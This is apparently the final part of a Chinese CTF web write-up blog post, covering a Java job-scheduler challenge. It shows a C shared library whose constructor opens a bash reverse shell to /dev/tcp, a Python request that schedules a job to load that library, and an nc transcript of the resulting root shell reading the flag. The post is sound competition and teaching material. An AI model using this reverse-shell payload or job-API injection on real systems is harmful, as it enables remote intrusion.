+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/10000 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250806214857415.png" alt="" loading="lazy"></figure>
+
+添加任务，这里写了一个小脚本</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://pss.idss-cn.com:24973/api/job/add&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;jobName&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;invokeTarget&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.System#load(&#39;/tmp/uploads/com.jabaez.FLAG.so&#39;)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;cronExpression&#34;</span><span class="p">:</span> <span class="s2">&#34;* * * * * ?&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span><span class="s2">&#34;http://127.0.0.1:8080&#34;</span><span class="p">,</span><span class="s2">&#34;https&#34;</span><span class="p">:</span><span class="s2">&#34;https://127.0.0.1:8080&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250806231821340.png" alt="" loading="lazy"></figure>
+
+调用 /api/job/run/{} 路由，执行反射任务
+<figure>
+  <img src="file-20250806215145287.png" alt="" loading="lazy"></figure>
+</p>
+<p>拿到反弹 Shell</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">root@hcss-ecs-91cd:~# nc -lvnp 10000
+</span></span><span class="line"><span class="cl">Listening on 0.0.0.0 10000
+</span></span><span class="line"><span class="cl">Connection received on ip 52558
+</span></span><span class="line"><span class="cl">root@:/app# ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">jaba-ez.jar
+</span></span><span class="line"><span class="cl">root@be576fc22a74:/app# ls /
+</span></span><span class="line"><span class="cl">ls /
+</span></span><span class="line"><span class="cl">app
+</span></span><span class="line"><span class="cl">bin
+</span></span><span class="line"><span class="cl">boot
+</span></span><span class="line"><span class="cl">dev
+</span></span><span class="line"><span class="cl">etc
+</span></span><span class="line"><span class="cl">flag.txt
+</span></span><span class="line"><span class="cl">flags
+</span></span><span class="line"><span class="cl">home
+</span></span><span class="line"><span class="cl">jdk
+</span></span><span class="line"><span class="cl">lib
+</span></span><span class="line"><span class="cl">lib32
+</span></span><span class="line"><span class="cl">lib64
+</span></span><span class="line"><span class="cl">libx32
+</span></span><span class="line"><span class="cl">media
+</span></span><span class="line"><span class="cl">mnt
+</span></span><span class="line"><span class="cl">opt
+</span></span><span class="line"><span class="cl">proc
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">sbin
+</span></span><span class="line"><span class="cl">srv
+</span></span><span class="line"><span class="cl">sys
+</span></span><span class="line"><span class="cl">tmp
+</span></span><span class="line"><span class="cl">usr
+</span></span><span class="line"><span class="cl">var
+</span></span><span class="line"><span class="cl">root@:/app# cat /flag.txt
+</span></span><span class="line"><span class="cl">cat /flag.txt
+</span></span><span class="line"><span class="cl">flag{KgUDzLceFxxxxxxxxx}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>剩下两题没解出来，后面看看能不能复现补一下</p>
+<h1 class="heading-element" id="ezyaml"><span>ezyaml</span>
+  <a href="#ezyaml" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h1 class="heading-element" id="ez_py"><span>ez_py</span>
+  <a href="#ez_py" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1></div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/java/" class="post-footer-tag-link" title="Tags - Java">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Java</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/" data-title="第十届 “磐石行动” 初赛 2025 Web Writeup" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="Java"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/" data-hashtag="Java"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/" data-title="第十届 “磐石行动” 初赛 2025 Web Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">浅析 PHPCMSv9.6.3 上下文逃逸导致RCE</div>
+          </div>
+        </a><a href="/posts/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#ezdecryption">ezDecryption</a></li>
+    <li><a href="#jaba_ez">jaba_ez</a></li>
+    <li><a href="#ezyaml">ezyaml</a></li>
+    <li><a href="#ez_py">ez_py</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/60831ac8ce662fba3ed8b0be2803e434.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
